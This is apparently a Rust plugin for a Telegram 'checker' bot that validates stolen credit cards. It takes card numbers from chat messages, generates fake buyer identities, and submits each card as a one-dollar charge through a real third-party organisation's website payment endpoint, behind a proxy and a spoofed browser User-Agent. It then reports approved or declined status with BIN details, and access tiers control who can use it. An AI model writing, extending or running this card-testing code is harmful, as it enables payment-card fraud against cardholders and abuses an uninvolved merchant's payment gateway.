use crate::config::get_config;
use crate::database::sql::{self, fetch_user};
use crate::handle_database_error;
use crate::logging::{get_logger, LoggerHandle};
use crate::plugin_handler::*;
use crate::plugins::helpers::utils::bin_lookup::lookup_bin;
use crate::plugins::helpers::*;
use crate::safe_database_operation;
use chrono::Utc;
use rand::Rng;
use regex::Regex;
use reqwest;
use serde::{Deserialize, Serialize};
use teloxide::payloads::{EditMessageTextSetters, SendMessageSetters};
use teloxide::sugar::request::RequestLinkPreviewExt;
use teloxide::types::{Message, ParseMode};
use teloxide::{prelude::Requester, Bot};
use teloxide_plugin::TeloxidePlugin;

// Helper function to create HTTP client with proxy
fn create_proxy_client() -> Result<reqwest::Client, String> {
    let config = get_config().map_err(|e| e.to_string())?;

    if let Some(proxy_url) = &config.config.proxy.proxy {
        let proxy =
            reqwest::Proxy::all(proxy_url).map_err(|e| format!("Failed to create proxy: {}", e))?;

        reqwest::Client::builder()
            .proxy(proxy)
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .map_err(|e| format!("Failed to create client with proxy: {}", e))
    } else {
        reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .map_err(|e| format!("Failed to create client: {}", e))
    }
}

lazy_static::lazy_static! {
    static ref LOGGER: std::sync::Arc<LoggerHandle> = {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(get_logger("ANPlugin"))
        })
    };
}

// Random user data generation for AuthNet
fn generate_random_user() -> (String, String, String, String, String, String, String) {
    let first_names = vec![
        "John",
        "Jane",
        "Michael",
        "Sarah",
        "David",
        "Emily",
        "James",
        "Jessica",
        "Robert",
        "Ashley",
        "William",
        "Jennifer",
        "Christopher",
        "Lisa",
        "Daniel",
        "Nancy",
        "Matthew",
        "Karen",
        "Anthony",
        "Betty",
    ];
    let last_names = vec![
        "Smith",
        "Johnson",
        "Williams",
        "Brown",
        "Jones",
        "Garcia",
        "Miller",
        "Davis",
        "Rodriguez",
        "Martinez",
        "Hernandez",
        "Lopez",
        "Gonzalez",
        "Wilson",
        "Anderson",
        "Thomas",
        "Taylor",
        "Moore",
        "Jackson",
        "Martin",
    ];
    let cities = vec![
        "New York",
        "Los Angeles",
        "Chicago",
        "Houston",
        "Phoenix",
        "Philadelphia",
        "San Antonio",
        "San Diego",
        "Dallas",
        "San Jose",
        "Austin",
        "Jacksonville",
        "Fort Worth",
        "Columbus",
        "Charlotte",
        "San Francisco",
        "Indianapolis",
        "Seattle",
        "Denver",
        "Washington",
    ];
    let states = vec![
        "NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA", "TX", "FL", "TX", "OH", "NC",
        "CA", "IN", "WA", "CO", "DC",
    ];

    let mut rng = rand::rng();
    let first_name = first_names[rng.random_range(0..first_names.len())].to_string();
    let last_name = last_names[rng.random_range(0..last_names.len())].to_string();
    let city = cities[rng.random_range(0..cities.len())].to_string();
    let state = states[rng.random_range(0..states.len())].to_string();
    let zip = format!("{}", rng.random_range(10000..99999));
    let email = format!(
        "{}.{}{}@gmail.com",
        first_name.to_lowercase(),
        last_name.to_lowercase(),
        rng.random_range(100..999)
    );
    let phone = format!(
        "{}{}{}{}{}{}{}{}{}{}",
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10),
        rng.random_range(0..10)
    );

    (first_name, last_name, email, city, state, zip, phone)
}

#[TeloxidePlugin(commands = ["an", "an@KissShotChkBot"])]
pub struct ANPlugin;
impl ANPlugin {
    pub async fn handle(&self, bot: &Bot, message: &Message, msg: &str) {
        let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let user_id = message.from.as_ref().map(|u| u.id.0).unwrap_or(0) as i64;
        let chat_id = message.chat.id.0 as i64;
        
        let mut input_text = msg.to_string();
        if msg.len() < 16 {
            if let Some(reply) = message.reply_to_message().as_ref() {
                if let Some(reply_text) = reply.text() {
                    input_text = reply_text.to_string();
                }
            }
        }

        let credit_cards = Regex::new(
            get_config()
                .expect("Operation failed")
                .config
                .regex
                .cc_regex
                .as_str(),
        )
        .unwrap();

        let credit_cards_list: Vec<&str> = match credit_cards.find(input_text.as_str()) {
            Some(m) => vec![m.as_str()],
            None => Vec::new(),
        };

        if credit_cards_list.is_empty() {
            let reply = "<b>No credit cards found ❌</b>";
            bot.send_message(message.chat.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let sent_msg = bot
            .send_message(message.chat.id, "<b>Processing...</b>")
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();

        if !check_registration(user_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not registered. Please use: /register";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if check_banned(user_id).await {
            let access_denied_reason =
                "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are banned from using this bot.";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        } else if !check_access(chat_id).await {
            let access_denied_reason = "<b>Access denied ❌</b>\n\n<b>Reason:</b> You are not allowed to access this gateway here. Consider using it at: @heckervaultchat";
            bot.edit_message_text(message.chat.id, sent_msg.id, access_denied_reason)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let cooldown_remaining = get_antispam(user_id).await;
        if cooldown_remaining > 0 {
            let reply = format!(
                "<b>Antispam ⏱️</b>\n\n<b>Please retry after: {} seconds</b>",
                cooldown_remaining
            );
            bot.edit_message_text(message.chat.id, sent_msg.id, reply)
                .parse_mode(ParseMode::Html)
                .await
                .unwrap();
            return;
        }

        let user_cooldown = get_user_cooldown(user_id).await;
        if user_cooldown == 0 {
            if let Err(e) = set_user_antispam(user_id, 10).await {
                // Log error but don't fail the request
                println!("Failed to set antispam for user {}: {}", user_id, e);
            }
        }

        let mut results = Vec::new();
        let mut an_responses: Vec<Option<String>> = Vec::new();
        let start_time = std::time::Instant::now();

        for cc in credit_cards_list.iter() {
            let card_number = cc.split('|').next().unwrap_or(cc);

            if !luhn_check(card_number) {
                results.push(format!(
                    "<code>{}</code>\n<b>Status:</b> Invalid",
                    cc.replace(" | ", "|")
                ));
                an_responses.push(None);
            } else {
                match lookup_an(cc).await {
                    Ok(response) => {
                        let status = if response.contains("Your order has been received") {
                            "Approved ✅"
                        } else {
                            "Declined ❌"
                        };
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> {}",
                            cc.replace(" | ", "|"),
                            status
                        ));
                        an_responses.push(Some(response));
                    }
                    Err(_) => {
                        results.push(format!(
                            "<code>{}</code>\n<b>Status:</b> Error",
                            cc.replace(" | ", "|")
                        ));
                        an_responses.push(None);
                    }
                }
            }

            tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
        }

        let total_time = start_time.elapsed().as_secs_f64();
        let final_text = if credit_cards_list.len() == 1 {
            // Gather requester info
            let (first_name, profile_url) = if let Some(u) = message.from.as_ref() {
                let fname = u.first_name.clone();
                let url = if let Some(username) = u.username.clone() {
                    format!("https://t.me/{}", username)
                } else {
                    format!("tg://user?id={}", u.id.0)
                };
                (fname, url)
            } else {
                ("User".to_string(), "#".to_string())
            };

            // Determine role
            let role = match fetch_user(user_id).await {
                Ok(Some(u)) => match u.status.as_str() {
                    "ADMIN" => "Admin".to_string(),
                    "PREMIUM" => "Premium".to_string(),
                    _ => "Free".to_string(),
                },
                _ => "Free".to_string(),
            };

            // Proxy status
            let proxy_live = get_config()
                .expect("Operation failed")
                .config
                .proxy
                .proxy
                .is_some();
            let proxy_str = if proxy_live { "Live" } else { "Off" };

            // Get the actual response to determine both status and response text
            let (status, response_text) = if let Some(Some(resp)) = an_responses.get(0) {
                let is_approved =
                    resp.contains("Your order has been received.") || resp.contains("Approved");
                let status = if is_approved {
                    "Approved ✅"
                } else {
                    "Declined ❌"
                };

                let mut txt = resp.replace("✅", "").replace("❌", "").trim().to_string();

                // Clean up response text
                if txt.contains("Gateway Error!") {
                    txt = "Gateway Error!".to_string();
                }

                (status, txt)
            } else {
                let is_approved = results[0].contains("Approved");
                let status = if is_approved {
                    "Approved ✅"
                } else {
                    "Declined ❌"
                };
                let response_text = if is_approved {
                    "Approved".to_string()
                } else {
                    "Declined".to_string()
                };
                (status, response_text)
            };

            let bin_info = match lookup_bin(&credit_cards_list[0][..6]).await {
                Ok(bin_data) => format!(
                    "\n\n<b>Info</b>: {} - {} - {}\n<b>Issuer</b>: {}\n<b>Country</b>: {} {}\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {}  <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    bin_data.vendor, bin_data.btype, bin_data.level, bin_data.bank, bin_data.country, bin_data.flag, profile_url, first_name, role, proxy_str, total_time
                ),
                Err(_) => format!(
                    "\n\n<b>Requested</b>: <a href=\"{}\">{}</a> [{}]\n<b>Proxy</b>: {} | <b>Retry</b>: 0\n<b>Time</b>: {:.2} seconds",
                    profile_url, first_name, role, proxy_str, total_time
                )
            };

            format!(
                "<b>{}</b>\n\n<b>Card</b>: <code>{}</code>\n<b>Gateway</b>: Authnet Charge\n<b>Response</b>: {}{}",
                status,
                credit_cards_list[0].replace(" | ", "|"),
                response_text,
                bin_info
            )
        } else {
            format!(
                "<b>Total:</b> <code>{}</code> | <b>Processed:</b> <code>{}</code>\n\n{}\n\n<b>Time:</b> {:.2}s",
                credit_cards_list.len(),
                results.len(),
                results.join("\n\n"),
                total_time
            )
        };

        bot.edit_message_text(message.chat.id, sent_msg.id, final_text)
            .parse_mode(ParseMode::Html)
            .disable_link_preview(true)
            .await
            .unwrap();
    }
}

pub async fn lookup_an(cc: &str) -> Result<String, String> {
    let client = create_proxy_client()?;

    // Parse credit card
    let cc_parts: Vec<&str> = cc.split('|').collect();
    if cc_parts.len() < 4 {
        return Err("Invalid credit card format".to_string());
    }

    // Generate random user data
    let (fname, lname, email, city, state, zip, phone) = generate_random_user();

    // Prepare form data for AuthNet charge
    let form_data = format!(
        "method=credit&action=ltl_authorize_pay&amount=1&cc={}&mm={}&yy={}&firstname={}&lastname={}&email={}&tel={}&address={} ST 5&city={}&state={}&country=United+States&zip={}&msg=&dedicated_firstname=N%2FA&dedicated_lastname=N%2FA&dedicated_email=name%40host.com&dedicated_address=N%2FA&dedicated_city=N%2FA&dedicated_state=N%2FA&dedicated_zip=N%2FA&dedicated_note=&auth_url=https%3A%2F%2Flargerthanlifeusa.org%2Fwp-content%2Fthemes%2Fjupiter-child%2Fauth-gateway%2Fcharge-credit-card.php",
        cc_parts[0], cc_parts[1], cc_parts[2], fname, lname, email, phone, lname, city, state, zip
    );

    let response = client
        .post("https://largerthanlifeusa.org/wp-admin/admin-ajax.php")
        .header("Host", "largerthanlifeusa.org")
        .header(
            "User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
        )
        .header(
            "Content-Type",
            "application/x-www-form-urlencoded; charset=UTF-8",
        )
        .header("X-Requested-With", "XMLHttpRequest")
        .body(form_data)
        .send()
        .await
        .map_err(|e| {
            let _ = LOGGER.error(&format!("Failed to send Authnet request: {}", e));
            "Failed to process payment".to_string()
        })?;

    let response_text = response.text().await.map_err(|e| {
        let _ = LOGGER.error(&format!("Failed to read Authnet response: {}", e));
        "Failed to process payment".to_string()
    })?;

    // Parse response based on Python logic
    if response_text.contains("Your order has been received.") {
        Ok("Your order has been received.".to_string())
    } else {
        // Extract error message from response
        let error_msg = if response_text.contains(':') {
            response_text
                .split(':')
                .last()
                .unwrap_or(&response_text)
                .trim()
                .to_string()
        } else {
            response_text
        };
        Ok(error_msg)
    }
}
